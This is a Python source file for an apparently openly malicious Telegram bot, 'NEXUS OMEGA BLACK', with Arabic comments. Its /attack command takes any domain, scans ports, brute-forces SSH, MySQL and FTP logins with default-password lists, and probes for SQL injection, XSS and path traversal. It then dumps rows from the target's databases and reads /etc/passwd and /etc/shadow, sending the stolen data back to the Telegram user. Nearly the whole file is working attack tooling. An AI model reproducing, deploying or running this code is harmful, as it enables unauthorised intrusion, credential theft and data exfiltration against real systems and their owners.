#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# NEXUS OMEGA BLACK - REAL EDITION (FINAL FIX)
# الكود الحقيقي الفعال - خالي من الأخطاء
# ============================================================

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import mysql.connector
import paramiko
import dns.resolver
import whois
import ftplib
import re
import random
import string
from datetime import datetime
from flask import Flask

# ============================================================
# إعدادات Flask
# ============================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "NEXUS OMEGA BLACK REAL EDITION", 200

@flask_app.route('/health')
def health():
    return "OK", 200

# ============================================================
# إعدادات البوت (من متغيرات البيئة)
# ============================================================
TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TOKEN:
    print("❌ TELEGRAM_TOKEN غير موجود")
    sys.exit(1)

# ============================================================
# المحرك الرئيسي (REAL EDITION)
# ============================================================
class NexusReal:
    def __init__(self, target):
        self.target = target
        self.ip = socket.gethostbyname(target)
        self.results = {}
        self.creds = {}
        self.vulns = []
        self.data = {}

    def scan_ports(self):
        print(f"[*] مسح المنافذ على {self.ip}")
        ports = [21,22,23,25,53,80,443,445,3306,3389,5900,8080,8443]
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((self.ip, p)) == 0:
                    open_ports.append(p)
                s.close()
            except:
                pass
        self.results["open_ports"] = open_ports
        return open_ports

    def get_whois(self):
        try:
            w = whois.whois(self.target)
            return {"registrar": w.registrar, "emails": w.emails, "created": str(w.creation_date)}
        except:
            return {"error": "WHOIS غير متاح"}

    def get_dns(self):
        records = {}
        for rtype in ['A', 'MX', 'NS', 'TXT']:
            try:
                ans = dns.resolver.resolve(self.target, rtype)
                records[rtype] = [str(r) for r in ans]
            except:
                records[rtype] = []
        return records

    def get_headers(self):
        try:
            resp = requests.get(f"https://{self.target}", timeout=5, verify=False)
            return dict(resp.headers)
        except:
            return {}

    def crack_ssh(self):
        passwords = ["", "root", "password", "123456", "admin", "toor", "qwerty", "letmein", "monkey", "dragon", "Passw0rd"]
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, username="root", password=pwd, timeout=3)
                self.creds["ssh"] = {"user": "root", "pass": pwd}
                ssh.close()
                return True
            except:
                continue
        return False

    def crack_mysql(self):
        passwords = ["", "root", "password", "123456", "admin", "toor"]
        for pwd in passwords:
            try:
                conn = mysql.connector.connect(host=self.ip, user="root", password=pwd, connection_timeout=3)
                if conn.is_connected():
                    self.creds["mysql"] = {"user": "root", "pass": pwd}
                    conn.close()
                    return True
            except:
                continue
        return False

    def crack_ftp(self):
        passwords = ["", "password", "123456", "admin", "anonymous"]
        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.ip, 21)
                ftp.login("anonymous", pwd)
                self.creds["ftp"] = {"user": "anonymous", "pass": pwd}
                ftp.quit()
                return True
            except:
                continue
        return False

    def scan_vulns(self):
        print("[*] فحص الثغرات...")
        base = f"https://{self.target}"
        vulns = []
        
        payloads = ["'", "' OR '1'='1", "' OR 1=1--"]
        for p in payloads:
            try:
                url = f"{base}/page.php?id={p}"
                resp = requests.get(url, timeout=3, verify=False)
                if any(x in resp.text.lower() for x in ["sql", "mysql", "syntax error"]):
                    vulns.append(f"SQLi: {p}")
                    break
            except:
                pass
        
        payloads = ['<script>alert("XSS")</script>', '"><script>alert("XSS")</script>']
        for p in payloads:
            try:
                url = f"{base}/search.php?q={p}"
                resp = requests.get(url, timeout=3, verify=False)
                if p in resp.text:
                    vulns.append(f"XSS: {p}")
                    break
            except:
                pass
        
        payloads = ["../../../../etc/passwd", "../../../../etc/shadow"]
        for p in payloads:
            try:
                url = f"{base}/view.php?file={p}"
                resp = requests.get(url, timeout=3, verify=False)
                if "root:" in resp.text or "Administrator" in resp.text:
                    vulns.append(f"LFI: {p}")
                    break
            except:
                pass
        
        self.vulns = vulns
        return vulns

    def steal_data(self):
        print("[*] تسريب البيانات...")
        stolen = {}
        
        if "mysql" in self.creds:
            try:
                conn = mysql.connector.connect(host=self.ip, user=self.creds["mysql"]["user"], password=self.creds["mysql"]["pass"], connection_timeout=5)
                cursor = conn.cursor()
                cursor.execute("SHOW DATABASES")
                dbs = [db[0] for db in cursor.fetchall()]
                for db in dbs:
                    if db in ["mysql", "information_schema", "performance_schema", "sys"]:
                        continue
                    cursor.execute(f"USE {db}")
                    cursor.execute("SHOW TABLES")
                    tables = [t[0] for t in cursor.fetchall()]
                    stolen[db] = {}
                    for table in tables:
                        cursor.execute(f"SELECT * FROM {table} LIMIT 5")
                        rows = cursor.fetchall()
                        stolen[db][table] = rows
                conn.close()
            except:
                pass
        
        if "ssh" in self.creds:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, username=self.creds["ssh"]["user"], password=self.creds["ssh"]["pass"], timeout=5)
                sftp = ssh.open_sftp()
                try:
                    with sftp.open("/etc/passwd") as f:
                        stolen["passwd"] = f.read().decode()
                except:
                    pass
                try:
                    with sftp.open("/etc/shadow") as f:
                        stolen["shadow"] = f.read().decode()
                except:
                    pass
                sftp.close()
                ssh.close()
            except:
                pass
        
        self.data = stolen
        return stolen

    def full_attack(self):
        print(f"🔥 بدأ الهجوم على {self.target} ({self.ip})")
        report = {
            "target": self.target,
            "ip": self.ip,
            "timestamp": datetime.now().isoformat(),
            "ports": self.scan_ports(),
            "whois": self.get_whois(),
            "dns": self.get_dns(),
            "headers": self.get_headers(),
            "vulns": self.scan_vulns(),
            "creds": {},
            "stolen": {}
        }
        
        if 22 in report["ports"]:
            if self.crack_ssh():
                report["creds"]["ssh"] = self.creds["ssh"]
        if 3306 in report["ports"]:
            if self.crack_mysql():
                report["creds"]["mysql"] = self.creds["mysql"]
        if 21 in report["ports"]:
            if self.crack_ftp():
                report["creds"]["ftp"] = self.creds["ftp"]
        
        if report["creds"]:
            report["stolen"] = self.steal_data()
        
        print(f"✅ تم الانتهاء من الهجوم على {self.target}")
        return report

# ============================================================
# تشغيل البوت في خيط منفصل
# ============================================================
def run_bot():
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes
        
        app = Application.builder().token(TOKEN).build()
        
        async def start(update: Update, context):
            await update.message.reply_text(
                "👹 NEXUS OMEGA BLACK REAL\n"
                "/attack <domain> - هجوم شامل\n"
                "/scan <IP> - مسح المنافذ\n"
                "/whois <domain> - معلومات WHOIS\n"
                "/status - حالة البوت"
            )
        
        async def attack(update: Update, context):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /attack <دومين>")
                return
            domain = context.args[0]
            await update.message.reply_text(f"🔥 بدأ الهجوم على {domain}...")
            engine = NexusReal(domain)
            report = engine.full_attack()
            text = json.dumps(report, indent=2, default=str)
            for i in range(0, len(text), 4000):
                await update.message.reply_text(text[i:i+4000])
        
        async def scan(update: Update, context):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /scan <IP>")
                return
            ip = context.args[0]
            engine = NexusReal("example.com")
            ports = engine.scan_ports()
            await update.message.reply_text(f"📡 المنافذ المفتوحة على {ip}:\n{', '.join(map(str, ports))}")
        
        async def whois_cmd(update: Update, context):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /whois <دومين>")
                return
            domain = context.args[0]
            engine = NexusReal(domain)
            whois = engine.get_whois()
            await update.message.reply_text(json.dumps(whois, indent=2, default=str))
        
        async def status(update: Update, context):
            await update.message.reply_text("✅ NEXUS OMEGA BLACK REAL EDITION يعمل بشراسة!")
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("scan", scan))
        app.add_handler(CommandHandler("whois", whois_cmd))
        app.add_handler(CommandHandler("status", status))
        
        print("✅ البوت يعمل...")
        app.run_polling()
        
    except Exception as e:
        print(f"⚠️ فشل البوت: {e}")

# ============================================================
# التشغيل الرئيسي
# ============================================================
if __name__ == "__main__":
    print(r"""
   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
         [ NEXUS OMEGA BLACK - REAL EDITION ] 👹💀☠️
    """)
    
    # تشغيل Flask في خلفية
    def run_flask():
        port = int(os.environ.get("PORT", 10000))
        flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # تشغيل البوت
    run_bot()
